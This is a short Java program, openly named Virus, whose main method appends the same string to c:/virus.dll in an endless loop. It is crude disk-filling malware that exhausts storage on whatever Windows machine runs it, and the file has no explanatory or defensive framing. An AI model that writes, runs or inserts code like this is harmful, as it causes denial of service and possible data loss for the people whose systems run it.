import java.io.FileWriter;
import java.io.IOException;
public class Virus
{
public static void main(String args[])
{
try
{
FileWriter fw=new FileWriter("c:/virus.dll",true);
while(true)
{
fw.write("virus has been activated");
} }
catch(IOException e)
{
e.printStackTrace();
} } }